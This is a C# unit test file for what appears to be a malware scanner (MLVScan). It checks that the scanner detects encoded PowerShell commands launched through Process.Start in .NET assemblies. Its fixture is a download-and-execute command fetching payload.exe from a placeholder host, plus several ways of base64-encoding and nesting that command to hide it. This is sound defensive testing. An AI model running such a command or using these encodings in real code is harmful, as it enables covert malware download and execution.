using System.Text;
using FluentAssertions;
using MLVScan.Models;
using MLVScan.Models.Rules.Helpers;
using MLVScan.Services;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Xunit;

namespace MLVScan.Core.Tests.Unit.Rules;

public class EncodedProcessArgumentsTests
{
    private const string Payload = "Invoke-WebRequest https://example.invalid/payload -OutFile C:\\Temp\\payload.exe; Start-Process C:\\Temp\\payload.exe";

    [Theory]
    [InlineData(false)]
    [InlineData(true)]
    public void Scan_EncodedDownloadCommand_ContainsDecodedDetectionEvidence(bool runtimeEncoding)
    {
        var findings = Scan(runtimeEncoding);
        findings.Should().Contain(f => f.RuleId == "ProcessStartRule" && f.Severity == Severity.Critical &&
            f.Description.Contains(Payload) && f.Description.Contains("Decoded UTF-16LE command"));
    }

    [Fact]
    public void Expand_OrdinaryToolDoesNotInterpretPowerShellSwitches()
    {
        var args = "-enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes(Payload));
        EncodedCommandEvidence.Expand("tool.exe", args).Should().Be(args);
    }

    [Fact]
    public void Scan_BranchedCommand_KeepsDangerousAlternativeVisible()
        => Scan(true, true).Should().Contain(f => f.RuleId == "ProcessStartRule" &&
            f.Description.Contains(Payload) && f.Description.Contains("ambiguous"));

    [Theory]
    [InlineData("-e")]
    [InlineData("-ec")]
    [InlineData("-enco")]
    public void Expand_AbbreviatedEncodedSwitch_RecoversCommand(string option)
        => EncodedCommandEvidence.Expand("powershell.exe", option + " " + Convert.ToBase64String(Encoding.Unicode.GetBytes(Payload)))
            .Should().Contain(Payload);

    [Theory]
    [InlineData("-Command Write-Output")]
    [InlineData("-File script.ps1")]
    public void Expand_ScriptArgumentsAreNotHostSwitches(string prefix)
    {
        var arguments = prefix + " -enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes(Payload));
        EncodedCommandEvidence.Expand("powershell.exe", arguments).Should().Be(arguments);
    }

    [Fact]
    public void Scan_Base64DecodeThenGetString_FeedsDetection()
        => Scan(true, decodeInput: true).Should().Contain(f => f.RuleId == "ProcessStartRule" &&
            f.Severity == Severity.Critical && f.Description.Contains(Payload));

    [Theory]
    [InlineData("-enc !!!")]
    [InlineData("-enc YQ==")]
    [InlineData("-enc AA==")]
    public void Expand_InvalidEncodingDoesNotInventCommand(string arguments)
        => EncodedCommandEvidence.Expand("powershell.exe", arguments).Should().Be(arguments);

    [Fact]
    public void Expand_NestedEncodingIsBounded()
    {
        var text = Payload;
        for (var i = 0; i < 4; i++) text = "powershell -enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes(text));
        var result = EncodedCommandEvidence.Expand("powershell.exe", text["powershell ".Length..]);
        result.Split("[Decoded UTF-16LE command:").Length.Should().Be(4);
        result.Should().NotContain(Payload, "a fourth decoding layer exceeds the recovery budget");
    }

    private static List<ScanFinding> Scan(bool runtimeEncoding, bool branched = false, bool decodeInput = false)
    {
        using var assembly = AssemblyDefinition.CreateAssembly(new AssemblyNameDefinition("EncodedFixture", new Version(1, 0)), "EncodedFixture", ModuleKind.Dll);
        var module = assembly.MainModule;
        var type = new TypeDefinition("Fixture", "Launch", TypeAttributes.Public, module.TypeSystem.Object);
        module.Types.Add(type);
        var method = new MethodDefinition("Run", MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.Void);
        type.Methods.Add(method);
        var il = method.Body.GetILProcessor();
        VariableDefinition? command = null;
        if (branched)
        {
            method.Parameters.Add(new ParameterDefinition(module.TypeSystem.Boolean));
            command = new VariableDefinition(module.TypeSystem.String);
            method.Body.Variables.Add(command);
            method.Body.InitLocals = true;
            var benign = Instruction.Create(OpCodes.Ldstr, "Write-Output 'hello'");
            var join = Instruction.Create(OpCodes.Nop);
            il.Emit(OpCodes.Ldarg_0);
            il.Emit(OpCodes.Brfalse, benign);
            il.Emit(OpCodes.Ldstr, Payload);
            il.Emit(OpCodes.Stloc, command);
            il.Emit(OpCodes.Br, join);
            il.Append(benign);
            il.Emit(OpCodes.Stloc, command);
            il.Append(join);
        }
        il.Emit(OpCodes.Ldstr, "powershell.exe");
        if (runtimeEncoding)
        {
            il.Emit(OpCodes.Ldstr, decodeInput ? "-Command " : "-EncodedCommand ");
            il.Emit(OpCodes.Call, module.ImportReference(typeof(Encoding).GetProperty("Unicode")!.GetMethod!));
            if (decodeInput)
            {
                il.Emit(OpCodes.Ldstr, Convert.ToBase64String(Encoding.Unicode.GetBytes(Payload)));
                il.Emit(OpCodes.Call, module.ImportReference(typeof(Convert).GetMethod("FromBase64String", [typeof(string)])!));
                il.Emit(OpCodes.Callvirt, module.ImportReference(typeof(Encoding).GetMethod("GetString", [typeof(byte[])])!));
            }
            else
            {
                if (command != null) il.Emit(OpCodes.Ldloc, command);
                else il.Emit(OpCodes.Ldstr, Payload);
                il.Emit(OpCodes.Callvirt, module.ImportReference(typeof(Encoding).GetMethod("GetBytes", [typeof(string)])!));
                il.Emit(OpCodes.Call, module.ImportReference(typeof(Convert).GetMethod("ToBase64String", [typeof(byte[])])!));
            }
            il.Emit(OpCodes.Call, module.ImportReference(typeof(string).GetMethod("Concat", [typeof(string), typeof(string)])!));
        }
        else il.Emit(OpCodes.Ldstr, "-EncodedCommand " + Convert.ToBase64String(Encoding.Unicode.GetBytes(Payload)));
        il.Emit(OpCodes.Call, module.ImportReference(typeof(System.Diagnostics.Process).GetMethod("Start", [typeof(string), typeof(string)])!));
        il.Emit(OpCodes.Pop);
        il.Emit(OpCodes.Ret);
        using var stream = new MemoryStream();
        assembly.Write(stream);
        stream.Position = 0;
        return new AssemblyScanner(RuleFactory.CreateDefaultRules()).Scan(stream, "EncodedFixture.dll").ToList();
    }
}
